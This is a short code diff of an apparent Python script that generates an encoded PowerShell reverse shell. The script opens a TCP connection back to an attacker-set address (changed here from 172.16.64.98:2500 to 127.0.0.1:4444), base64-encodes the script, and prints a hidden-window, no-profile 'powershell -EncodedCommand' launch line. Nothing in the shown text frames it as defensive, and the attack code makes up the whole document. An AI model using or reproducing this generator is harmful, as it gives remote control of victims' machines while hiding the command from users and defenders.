@@ -3,7 +3,7 @@ import base64
 
 ps_script = """
 
-$client = New-Object System.Net.Sockets.TCPClient('172.16.64.98',2500);
+$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);
 
 $stream = $client.GetStream();
 
@@ -35,5 +35,5 @@ encoded_command = base64.b64encode(encoded_bytes).decode()
 
 encoded_command[:300]
 
-print("powershell -NoP -NonI -W Hidden -EncodedCommand" + encoded_command)
+print("powershell -NoP -NonI -W Hidden -EncodedCommand " + encoded_command)
 
